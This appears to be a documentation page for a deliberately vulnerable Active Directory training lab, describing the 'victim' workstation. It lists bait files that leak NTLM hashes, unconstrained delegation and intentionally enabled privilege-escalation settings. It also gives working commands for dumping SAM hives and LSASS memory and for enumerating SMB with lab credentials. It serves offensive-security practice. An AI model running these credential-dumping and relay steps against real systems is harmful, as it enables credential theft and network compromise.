# ws01.corp.local — 10.10.0.100

The **victim workstation**. This is where phishing lands, where users' tokens live in LSASS, where coercion drops bait files, and where almost every local LPE primitive is wired up. **No attacker tools are pre-installed for you** — drop your own once you land here.

## Listening ports

| Port | Proto | Service | Notes |
|---|---|---|---|
| 135/139/445 | TCP | RPC + SMB | **SMB signing OFF (client + server)** → relay viable |
| 3389 | TCP | RDP | NLA default |
| 5985 | TCP | WinRM | |

## Shares + bait files

| Share | Bait | Purpose |
|---|---|---|
| `PublicShare` (C:\Shared) | `HR-Documents.scf`, `Quarterly-Report.url`, `Quarterly-Reports.library-ms` | NTLM leak when previewed (CVE-2025-24071, .scf, .url) |
| `IPC$` | — | session enumeration |

## Delegation

- `WS01$` **TRUSTED_FOR_DELEGATION** (unconstrained) — TGTs of every user who logs in get cached in LSASS

## Local LPE / cred-access primitives

| Vector | Wired |
|---|---|
| `AlwaysInstallElevated` | HKLM + HKCU set (PE-008) |
| UAC bypass | `ConsentPromptBehaviorAdmin=0` |
| SAM/SYSTEM/SECURITY readable by Users | yes (CRED-006) — `reg save` without SeBackup |
| `CorpSync` scheduled task with `C:\VulnTasks` Users:F | yes (PE-005) |
| Vulnerable-driver staging dir `C:\DVAD\drivers` | yes (BYOVD) |
| `CORP\attacker` in local Administrators | yes — once you're "attacker" (any escalation route), you're admin |
| Pre-staged ADIDNS A record `new-fileserver.corp.local → 10.10.0.100` | yes (PER-030) |

## Minimum enum sweep (after landing here via phishing/RCE/LPE)

```cmd
:: identity
whoami /all
:: signing
reg query "HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters" /v RequireSecuritySignature
:: AIE
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
:: SAM dump (no SeBackup needed — files are readable)
reg save HKLM\SAM C:\Temp\sam
reg save HKLM\SYSTEM C:\Temp\system
reg save HKLM\SECURITY C:\Temp\security
:: LSASS via MiniDumpWriteDump (no mimikatz needed)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <pid_lsass> C:\Temp\lsass.dmp full
:: Tickets in memory (will include other interactive users' TGTs because unconstrained)
:: -> exfil and Pass-the-Ticket
:: Token / Potato
whoami /priv | findstr Impersonate
```

## From Kali, before landing

```bash
W=10.10.0.100
nxc smb $W -u alice -p 'DVADlab2024!' --shares
nxc smb $W -u alice -p 'DVADlab2024!' --loggedon-users   # see who's there
# Hash-leak via bait file:
smbclient //$W/PublicShare -U alice%'DVADlab2024!' -c 'get HR-Documents.scf'
# Phishing landing scenarios:
#   • email with .library-ms in ZIP (IA-024)
#   • .lnk in PublicShare → user double-clicks (IA-020)
#   • .url file (PerSession NTLM leak)
```

## Forward to

IA-019..028 (phishing/LPE entry vectors), CRED-005/006/010 (LSASS / SAM / token), PE-008/005, CRED-018 (TGTs in LSASS due to unconstrained), LAT-005 (pivot back into corp from this beachhead).
